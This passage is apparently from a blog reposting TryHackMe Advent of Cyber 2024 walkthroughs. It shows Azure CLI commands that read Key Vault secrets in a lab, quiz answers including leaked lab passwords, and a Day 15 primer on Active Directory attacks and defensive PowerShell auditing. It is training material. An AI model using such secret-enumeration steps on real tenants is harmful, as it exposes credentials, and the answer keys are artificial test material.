<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">keyvault</span> <span class="nx">secret</span> <span class="nx">list</span> <span class="o">--</span><span class="nx">vault</span><span class="o">-</span><span class="nx">name</span> <span class="nx">warevillesecrets</span>
<span class="p">[</span>
  <span class="p">{</span>
    <span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
    <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://warevillesecrets.vault.azure.net/secrets/REDACTED</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">managed</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">REDACTED</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">tags</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
  <span class="p">}</span>
<span class="p">]</span>

</code></pre></div></div>

<p>\n After executing the two previous commands, we confirmed that the<strong>Reader</strong> role allows us to view the key vault metadata, specifically the list of key vaults and secrets. Now, the only thing left to confirm is whether the current user can access the contents of the discovered secret with the <strong>Key Vault Secrets User</strong> role. This can be done by executing the following command.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">keyvault</span> <span class="nx">secret</span> <span class="nx">show</span> <span class="o">--</span><span class="nx">vault</span><span class="o">-</span><span class="nx">name</span> <span class="nx">warevillesecrets</span> <span class="o">--</span><span class="nx">name</span> <span class="nx">REDACTED</span>
<span class="p">{</span>
  <span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
  <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://warevillesecrets.vault.azure.net/secrets/REDACTED/20953fbf6d51464299b30c6356b378fd</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">kid</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">managed</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">REDACTED</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">tags</span><span class="dl">"</span><span class="p">:</span> <span class="p">{},</span>
  <span class="dl">"</span><span class="s2">value</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">REDACTED</span><span class="dl">"</span>
<span class="p">}</span>
</code></pre></div></div>

<p>** \n Note:** Replace the value of the<code class="language-plaintext highlighter-rouge">--name</code> parameter with the actual secret name.</p>

<p>“Bingo!” the Glitch exclaimed as he saw the output above. McSkidy had confirmed her nightmare that a regular user could escalate their way into the secrets of Wareville.</p>

<p>With that, the Glitch had helped McSkidy to find the attack path that had been taken to escalate a user’s privileges and a lot had been learned in the process. The only question that remained was who had initially carried out the attack in the first place. There was a very limited set of Wares who had access to this tenant and with user visibility, and with that set of permissions, only town officials who perform governance validation on the tenant to ensure all the town’s secrets are being stored securely. The focus then turns to the motive; the only thing accessed was an access key stored in the key vault, which grants access to an evidence file stored elsewhere. The evidence in this file was in relation to recent cyber events this month in Wareville. We’ll have to keep our eyes peeled in the following days to get to the bottom of this.</p>

<h2 id="answer-the-questions-below">Answer the questions below</h2>

<p>What is the password for backupware that was leaked?</p>

<p>R3c0v3r_s3cr3ts!</p>

<p>What is the group ID of the Secret Recovery Group?</p>

<p>7d96660a-02e1-4112-9515-1762d0cb66b7</p>

<p>What is the name of the vault secret?</p>

<p>aoc2024</p>

<p>What are the contents of the secret stored in the vault?</p>

<p>WhereIsMyMind1999</p>

<p>Liked today’s task? Check the <a href="https://tryhackme.com/r/room/exploitingad">Exploiting Active Directory</a> room to practice user and group enumeration in a similar yet different environment!</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day16Header.png" /><media:content medium="image" url="http://localhost:4000/Day16Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber 2024 - Day 15</title><link href="http://localhost:4000/Day15" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber 2024 - Day 15" /><published>2024-12-15T00:00:00-05:00</published><updated>2024-12-15T00:00:00-05:00</updated><id>http://localhost:4000/Day15</id><content type="html" xml:base="http://localhost:4000/Day15"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1731939602671.png" alt="Task banner for day DAY 15" /></p>

<p>Ahead of SOC-mas, the team decided to do a routine security check of one of their Active Directory domain controllers. Upon some quick auditing, the team noticed something was off. Could it be? The domain controller has been breached? With sweat on their brows, the SOC team smashed the glass and hit the panic alarm. There’s only one person who can save us…</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Learn about the structures of Active Directory.</li>
  <li>Learn about common Active Directory attacks.</li>
  <li>Investigate a breach against an Active Directory.</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730733634851.png" alt="Banner showing the connection details for this room." /></p>

<p>Click the green <strong>Start Machine</strong> button below to start the virtual machine in split-view. The VM should be fully loaded in 2 minutes.</p>

<p>Start Machine</p>

<p>If the VM is not visible, use the blue Show Split View button at the top of the page. The credentials to connect to the machine directly using RDP have been provided below. Remember, you will need to be connected to the TryHackMe VPN to do so.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM Key Credentials" /></p>

<table>
  <thead>
    <tr>
      <th><strong>Username</strong></th>
      <th>WAREVILLE\Administrator</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Password</strong></td>
      <td>AOCInvestigations!</td>
    </tr>
    <tr>
      <td><strong>IP</strong></td>
      <td>MACHINE_IP</td>
    </tr>
  </tbody>
</table>

<h2 id="introducing-active-directory">Introducing Active Directory</h2>

<p>Before diving into Active Directory, let us understand how network infrastructures can be mapped out and ensure that access to resources is well managed. This is typically done through <strong>Directory Services,</strong> which map and provide access to network resources within an organisation. The <strong>Lightweight Directory Access Protocol (LDAP)</strong> forms the core of Directory Services. It provides a mechanism for accessing and managing directory data to ensure that searching for and retrieving information about subjects and objects such as users, computers, and groups is quick.</p>

<p><strong>Active Directory</strong> (AD) is, therefore, a Directory Service at the heart of most enterprise networks that stores information about objects in a network. The associated objects can include:</p>

<ul>
  <li><strong>Users</strong>: Individual accounts representing people or services</li>
  <li><strong>Groups</strong>: Collections of users or other objects, often with specific permissions</li>
  <li><strong>Computers</strong>: Machines that belong to the domain governed by AD policies</li>
  <li><strong>Printers</strong> and other <strong>resources</strong>: Network-accessible devices or services</li>
</ul>

<p>The building blocks of an AD architecture include:</p>

<ul>
  <li><strong>Domains</strong>: Logical groupings of network resources such as users, computers, and services. They serve as the main boundary for AD administration and can be identified by their <strong>Domain Component and Domain Controller</strong> name. Everything inside a domain is subject to the same security policies and permissions.</li>
  <li><strong>Organisational Units (OUs)</strong>: OUs are containers within a domain that help group objects based on departments, locations or functions for easier management. Administrators can apply Group Policy settings to specific OUs, allowing more granular control of security settings or access permissions.</li>
  <li><strong>Forest</strong>: A collection of one or more domains that share a standard schema, configuration, and global catalogue. The forest is the top-level container in AD.</li>
  <li><strong>Trust Relationships</strong>: Domains within a forest (and across forests) can establish trust relationships that allow users in one domain to access resources in another, subject to permission.</li>
</ul>

<p>Combining all these components allows us to establish the <strong>Distinguished Name (DN)</strong> that an object belongs to within the AD. The structure of the name would be as follows:</p>

<p><code class="language-plaintext highlighter-rouge">DN=CN=Mayor Malware, OU=Management, DC=wareville, DC=thm</code></p>

<p><strong>Core Active Directory Components</strong></p>

<p>Active Directory contains several key components that allow it to provide a wide range of services. Understanding these components will give one a clear picture of how AD supports administrative and security operations.</p>

<ul>
  <li><strong>Domain Controllers (DCs):</strong> Domain Controllers are the servers that host Active Directory services. They store the AD database and handle authentication and authorisation requests, such as logging in users or verifying access to resources. Multiple DCs can exist within a domain for redundancy. When changes are made to AD (such as adding users or updating passwords), these changes are replicated across all DCs, ensuring that the directory remains consistent.</li>
  <li><strong>Global Catalog:</strong> The Global Catalog (GC) is a searchable database within AD that contains a subset of information from all objects in the directory. This allows users and services to locate objects in any domain in the forest, even if those objects reside in different domains.</li>
  <li><strong>LDAP (Lightweight Directory Access Protocol):</strong> AD uses this protocol to query and modify the directory. The protocol allows for fast searching and retrieving of information about objects such as users, computers, and groups.</li>
  <li><strong>Kerberos Authentication:</strong> The default authentication protocol used by AD provides secure authentication by using tickets rather than passwords.</li>
</ul>

<p><strong>Group Policy</strong></p>

<p>One of Active Directory’s most powerful features is <strong>Group Policy</strong>, which allows administrators to enforce policies across the domain. Group Policies can be applied to users and computers to enforce password policies, software deployment, firewall settings, and more.</p>

<p><strong>Group Policy Objects (GPOs)</strong> are the containers that hold these policies. A GPO can be linked to the entire domain, an OU, or a site, giving the flexibility in applying policies.</p>

<p>Let us say that McSkidy wants to ensure that all users within Wareville’s SOC follow a strict password policy, enforcing minimum password lengths and complexity rules. Here is how it would be done:</p>

<ol>
  <li>Using the Run window, open <strong>Group Policy Management</strong> from your server by typing <code class="language-plaintext highlighter-rouge">gpmc.msc</code>.</li>
  <li>Right-click your domain and select <strong>“Create a GPO in this domain, and Link it here”</strong>. Name the new GPO <strong>“Password Policy”</strong>.</li>
  <li>Edit the GPO by navigating to <strong>Computer Configuration -&gt; Policies -&gt; Windows Settings -&gt; Security Settings -&gt; Account Policies -&gt; Password Policy</strong>.</li>
  <li>Configure the following settings:
    <ul>
      <li>Minimum password length: 12 characters</li>
      <li>Enforce password history: 10 passwords</li>
      <li>Maximum password age: 90 days</li>
      <li>Password must meet complexity requirements: Enabled</li>
    </ul>
  </li>
  <li>Click <strong>OK</strong>, then link this GPO to the domain or specific OUs you want to target.</li>
</ol>

<p>This policy will now be applied across the domain, ensuring all users meet these password requirements.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1732022781821.png" alt="Creating and editing GPO settings for Password Policy." /></p>

<h2 id="common-active-directory-attacks">Common Active Directory Attacks</h2>

<p>Adversaries are always looking for ways to breach and exploit Active Directory environments to destabilise and cause havoc to organisations. Working with Glitch to secure SOC-mas requires us to know common attacks and their mitigation measures.</p>

<p><img src="https://assets.tryhackme.com/additional/tickets/ticket.svg" alt="Golden tickets representation." /></p>

<p><strong>Golden Ticket Attack</strong></p>

<p>A <strong>Golden Ticket</strong> attack allows attackers to exploit the Kerberos protocol and impersonate any account on the AD by forging a Ticket Granting Ticket (TGT). By compromising the <strong>krbtgt</strong> account and using its password hash, the attackers gain complete control over the domain for as long as the forged ticket remains valid. The attack requires four critical pieces of information to be successful:</p>

<ul>
  <li>Fully Qualified Domain Name (FQDN) of the domain</li>
  <li>SID of the domain</li>
  <li>Username of an account to impersonate</li>
  <li>KRBTGT account password hash</li>
</ul>

<p>Detection for this type of attack involves monitoring for unusual activity involving the <strong>krbtgt</strong></p>

<ul>
  <li><strong>Event ID 4768</strong>: Look for TGT requests for high-privilege accounts.</li>
  <li><strong>Event ID 4672</strong>: This logs when special privileges (such as SeTcbPrivilege) are assigned to a user.</li>
</ul>

<p><strong>Pass-the-Hash</strong></p>

<p>This type of attack steals the hash of a password and can be used to authenticate to services without needing the actual password. This is possible because the NTLM protocol allows authentication based on password hashes.</p>

<p>Key ways to mitigate this attack are enforcing strong password policies, conducting regular audits on account privileges, and implementing multi-factor authentication across the domain.</p>

<p><strong>Kerberoasting</strong></p>

<p><strong>Kerberoasting</strong> is an attack targeting Kerberos in which the attacker requests service tickets for accounts with Service Principal Names (SPNs), extracts the tickets and password hashes, and then attempts to crack them offline to retrieve the plaintext password.</p>

<p>Mitigation for this type of attack involves ensuring that service accounts are secured with strong passwords, and therefore, implementing secure policies across the AD would be the defence.</p>

<p><strong>Pass-the-Ticket</strong></p>

<p>In a <strong>Pass-the-Ticket</strong> attack, attackers steal Kerberos tickets from a compromised machine and use them to authenticate as the user or service whose ticket was stolen.</p>

<p>This attack can be detected through monitoring for suspicious logins using <strong>Event ID 4768</strong> (TGT request), especially if a user is logging in from unusual locations or devices. Additionally, <strong>Event ID 4624</strong> (successful login) will reveal tickets being used for authentication.</p>

<p><strong>Malicious GPOs</strong></p>

<p>Adversaries are known to abuse Group Policy to create persistent, privileged access accounts and distribute and execute malware by setting up policies that mimic software deployment across entire domains. With escalated privileges across the domain, attackers can create GPOs to accomplish goals at scale, including disabling core security software and features such as firewalls, antivirus, security updates, and logging. Additionally, scheduled tasks can be created to execute malicious scripts or exfiltration data from affected devices across the domain.</p>

<p>To mitigate against the exploitation of Group Policy, GPOs need to be regularly audited for unauthorised changes. Strict permissions and procedures for GPO modifications should also be enforced.</p>

<p><strong>Skeleton Key Attack</strong></p>

<p>In a <strong>Skeleton Key</strong> attack, attackers install a malware backdoor to log into any account using a master password. The legitimate password for each account would remain unchanged, but attackers can bypass it using the skeleton key password.</p>

<h2 id="investigating-an-active-directory-breach">Investigating an Active Directory Breach</h2>

<p><strong>Group Policy</strong></p>

<p>As previously discussed in this task, Group Policy is a means to distribute configurations and policies to enrolled devices in the domain. For attackers, Group Policy is a lucrative means of spreading malicious scripts to multiple devices.</p>

<p>Reviewing Group Policy Objects (GPOs) is a great investigation step. In this section, we will use PowerShell to audit our GPOs. First, we can use the <code class="language-plaintext highlighter-rouge">Get-GPO</code> cmdlet to list all GPOs installed on the domain controller.</p>

<p>Listing all GPOs viaPowerShell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">GPO</span> <span class="o">-</span><span class="nx">All</span>


<span class="nx">DisplayName</span>      <span class="p">:</span> <span class="nx">Default</span> <span class="nx">Domain</span> <span class="nx">Policy</span>
<span class="nx">DomainName</span>       <span class="p">:</span> <span class="nx">wareville</span><span class="p">.</span><span class="nx">thm</span>
<span class="nx">Owner</span>            <span class="p">:</span> <span class="nx">WAREVILLE</span><span class="err">\</span><span class="nx">Domain</span> <span class="nx">Admins</span>
<span class="nx">Id</span>               <span class="p">:</span> <span class="mi">31</span><span class="nx">b2f340</span><span class="o">-</span><span class="mi">016</span><span class="nx">d</span><span class="o">-</span><span class="mi">11</span><span class="nx">d2</span><span class="o">-</span><span class="mi">945</span><span class="nx">f</span><span class="o">-</span><span class="mi">00</span><span class="nx">c04fb984f9</span>
<span class="nx">GpoStatus</span>        <span class="p">:</span> <span class="nx">AllSettingsEnabled</span>
<span class="nx">Description</span>      <span class="p">:</span>
<span class="nx">CreationTime</span>     <span class="p">:</span> <span class="mi">10</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">12</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">31</span> <span class="nx">PM</span>
<span class="nx">ModificationTime</span> <span class="p">:</span> <span class="mi">10</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">12</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span> <span class="nx">PM</span>
<span class="nx">UserVersion</span>      <span class="p">:</span> <span class="nx">AD</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">SysVol</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">0</span>
<span class="nx">ComputerVersion</span>  <span class="p">:</span> <span class="nx">AD</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="nx">SysVol</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">3</span>
<span class="nx">WmiFilter</span>        <span class="p">:</span>

<span class="nx">DisplayName</span>      <span class="p">:</span> <span class="nx">Default</span> <span class="nx">Domain</span> <span class="nx">Controllers</span> <span class="nx">Policy</span>
<span class="nx">DomainName</span>       <span class="p">:</span> <span class="nx">wareville</span><span class="p">.</span><span class="nx">thm</span>
<span class="nx">Owner</span>            <span class="p">:</span> <span class="nx">WAREVILLE</span><span class="err">\</span><span class="nx">Domain</span> <span class="nx">Admins</span>
<span class="nx">Id</span>               <span class="p">:</span> <span class="mi">6</span><span class="nx">ac1786c</span><span class="o">-</span><span class="mi">016</span><span class="nx">f</span><span class="o">-</span><span class="mi">11</span><span class="nx">d2</span><span class="o">-</span><span class="mi">945</span><span class="nx">f</span><span class="o">-</span><span class="mi">00</span><span class="nx">c04fb984f9</span>
<span class="nx">GpoStatus</span>        <span class="p">:</span> <span class="nx">AllSettingsEnabled</span>
<span class="nx">Description</span>      <span class="p">:</span>
<span class="nx">CreationTime</span>     <span class="p">:</span> <span class="mi">10</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">12</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">31</span> <span class="nx">PM</span>
<span class="nx">ModificationTime</span> <span class="p">:</span> <span class="mi">10</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">12</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">30</span> <span class="nx">PM</span>
<span class="nx">UserVersion</span>      <span class="p">:</span> <span class="nx">AD</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">SysVol</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">0</span>
<span class="nx">ComputerVersion</span>  <span class="p">:</span> <span class="nx">AD</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">SysVol</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">1</span>
<span class="nx">WmiFilter</span>        <span class="p">:</span>

<span class="nx">DisplayName</span>      <span class="p">:</span> <span class="nx">SetWallpaper</span> <span class="nx">GPO</span>
<span class="nx">DomainName</span>       <span class="p">:</span> <span class="nx">wareville</span><span class="p">.</span><span class="nx">thm</span>
<span class="nx">Owner</span>            <span class="p">:</span> <span class="nx">WAREVILLE</span><span class="err">\</span><span class="nx">Domain</span> <span class="nx">Admins</span>
<span class="nx">Id</span>               <span class="p">:</span> <span class="nx">d634d7c1</span><span class="o">-</span><span class="nx">db7a</span><span class="o">-</span><span class="mi">4</span><span class="nx">c7a</span><span class="o">-</span><span class="nx">bf32</span><span class="o">-</span><span class="nx">efca23d93a56</span>
<span class="nx">GpoStatus</span>        <span class="p">:</span> <span class="nx">AllSettingsEnabled</span>
<span class="nx">Description</span>      <span class="p">:</span> <span class="nb">Set</span> <span class="nx">the</span> <span class="nx">wallpaper</span> <span class="k">of</span> <span class="nx">every</span> <span class="nx">domain</span> <span class="nx">joined</span> <span class="nx">machine</span>
<span class="nx">CreationTime</span>     <span class="p">:</span> <span class="mi">10</span><span class="o">/</span><span class="mi">30</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">9</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">36</span> <span class="nx">AM</span>
<span class="nx">ModificationTime</span> <span class="p">:</span> <span class="mi">10</span><span class="o">/</span><span class="mi">30</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">9</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">36</span> <span class="nx">AM</span>
<span class="nx">UserVersion</span>      <span class="p">:</span> <span class="nx">AD</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">SysVol</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">0</span>
<span class="nx">ComputerVersion</span>  <span class="p">:</span> <span class="nx">AD</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">SysVol</span> <span class="nx">Version</span><span class="p">:</span> <span class="mi">0</span>
<span class="nx">WmiFilter</span>        <span class="p">:</span>
</code></pre></div></div>

<p>\n</p>

<p>This would allow us to look for out-of-place GPOs. We can export a GPO to an HTML file for further investigation to make it easier to see what configurations the policy enforces. For this example, we will export the “SetWallpaper” GPO.</p>

<p><em>Please note that this is a demonstration GPO, and isn’t present on the practical machine for today’s task.</em></p>

<p>Exporting SetWallpaperGPO \n</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">GPOReport</span> <span class="o">-</span><span class="nx">Name</span> <span class="dl">"</span><span class="s2">SetWallpaper</span><span class="dl">"</span> <span class="o">-</span><span class="nx">ReportType</span> <span class="nx">HTML</span> <span class="o">-</span><span class="nx">Path</span> <span class="dl">"</span><span class="s2">.</span><span class="se">\</span><span class="s2">SetWallpaper.html</span><span class="dl">"</span>
</code></pre></div></div>

<p>\n</p>

<p>Then, when opening the HTML file in the browser, we are presented with an overview of things such as:</p>

<ul>
  <li>When the policy was created and modified.</li>
  <li>What devices or users the GPO applies to.</li>
  <li>The permissions over the GPO.</li>
  <li>The user or computer configurations that it enforces.</li>
</ul>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1730382678827.png" alt="SetWallpaper GPO in a HTML report for easier analysis. " /> \n</p>

<p>From the screenshot above, we can see that the policy sets the Desktop Wallpaper of devices using the image located in C:\THM.jpg on the domain controller.</p>

<p>Domains are naturally likely to have many GPOs. We can use the same Get-GPO cmdlet, with a bit of <em>PowerShell-fu</em> to list only those GPOs that were recently modified. This is a handy snippet because it highlights policies that were recently modified - perhaps by an attacker.</p>

<p>Listing recently modified GPOs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="err">\</span><span class="nx">Desktop</span><span class="o">&gt;</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">GPO</span> <span class="o">-</span><span class="nx">All</span> <span class="o">|</span> <span class="nx">Where</span><span class="o">-</span><span class="nb">Object</span> <span class="p">{</span> <span class="nx">$_</span><span class="p">.</span><span class="nx">ModificationTime</span> <span class="p">}</span> <span class="o">|</span> <span class="nx">Select</span><span class="o">-</span><span class="nb">Object</span> <span class="nx">DisplayName</span><span class="p">,</span> <span class="nx">ModificationTime</span>

<span class="nx">DisplayName</span>                                <span class="nx">ModificationTime</span>
<span class="o">-----------</span>                                <span class="o">----------------</span>
<span class="nx">Default</span> <span class="nx">Domain</span> <span class="nx">Policy</span>                      <span class="mi">10</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">12</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span> <span class="nx">PM</span>
<span class="nx">Default</span> <span class="nx">Domain</span> <span class="nx">Controllers</span> <span class="nx">Policy</span>          <span class="mi">10</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">12</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">30</span> <span class="nx">PM</span>
<span class="nx">SetWallpaper</span>                               <span class="mi">10</span><span class="o">/</span><span class="mi">31</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">1</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">04</span> <span class="nx">PM</span>
</code></pre></div></div>

<p>\n</p>

<h2 id="event-viewer">Event Viewer</h2>

<p>Windows comes packaged with the Event Viewer. This invaluable repository stores a record of system activity, including security events, service behaviours, and so forth.</p>

<p>For example, within the “Security” tab of Event Viewer, we can see the history of user logins, attempts and logoffs. The screenshot below shows a record of the user “cmnatic” attempting to log into the device.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1730383327428.png" alt="Records of a user logging in shown on the Event Viewer." /> \n</p>

<p>All categories of events are given an event ID. The table below provides notable event IDs for today’s task.</p>

<table>
  <thead>
    <tr>
      <th><strong>Event ID</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>4624</td>
      <td>A user account has logged on</td>
    </tr>
    <tr>
      <td>4625</td>
      <td>A user account failed to log on</td>
    </tr>
    <tr>
      <td>4672</td>
      <td>Special privileges (i.e. SeTcbPrivilege) have been assigned to a user</td>
    </tr>
    <tr>
      <td>4768</td>
      <td>A TGT (Kerberos) ticket was requested for a high-privileged account</td>
    </tr>
  </tbody>
</table>

<p>\n</p>

<h2 id="user-auditing">User Auditing</h2>

<p>User accounts are a valuable and often successful method of attack. You can use Event Viewer IDs to review user events and PowerShell to audit their status. Attack methods such as password spraying will eventually result in user accounts being locked out, depending on the domain controller’s lockout policy.</p>

<p>To view all locked accounts, you can use the Search-ADAccount cmdlet, applying some filters to show information such as the last time the user had successfully logged in.</p>

<p><code class="language-plaintext highlighter-rouge">Search-ADAccount -LockedOut | Select-Object Name, SamAccountName, LockedOut, LastLogonDate, DistinguishedName</code></p>

<p>\n</p>

<p>Additionally, a great way to quickly review the user accounts present on a domain, as well as their group membership, is by using the <code class="language-plaintext highlighter-rouge">Get-ADUser</code> cmdlet, demonstrated below:</p>

<p>Listing all users and their groups usingPowerShell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="err">\</span><span class="nx">Desktop</span><span class="o">&gt;</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">ADUser</span> <span class="o">-</span><span class="nx">Filter</span> <span class="o">*</span> <span class="o">-</span><span class="nx">Properties</span> <span class="nx">MemberOf</span> <span class="o">|</span> <span class="nx">Select</span><span class="o">-</span><span class="nb">Object</span> <span class="nx">Name</span><span class="p">,</span> <span class="nx">SamAccountName</span><span class="p">,</span> <span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="dl">"</span><span class="s2">Groups</span><span class="dl">"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">MemberOf</span><span class="p">}}</span>

<span class="nx">Name</span>           <span class="nx">SamAccountName</span> <span class="nx">Groups</span>
<span class="o">----</span>           <span class="o">--------------</span> <span class="o">------</span>
<span class="nx">Administrator</span>  <span class="nx">Administrator</span>  <span class="p">{</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Group</span> <span class="nx">Policy</span> <span class="nx">Creator</span> <span class="nx">Owners</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">wareville</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">thm</span><span class="p">,</span> <span class="nx">CN</span><span class="o">=</span><span class="nx">Domain</span> <span class="nx">Admins</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">wareville</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">thm</span><span class="p">,</span> <span class="nx">CN</span><span class="o">=</span><span class="nx">Enterprise</span> <span class="nx">Admins</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">wareville</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">thm</span><span class="p">,</span> <span class="nx">CN</span><span class="o">=</span><span class="nx">Schema</span> <span class="p">...</span>
<span class="nx">Guest</span>          <span class="nx">Guest</span>          <span class="nx">CN</span><span class="o">=</span><span class="nx">Guests</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Builtin</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">wareville</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">thm</span>
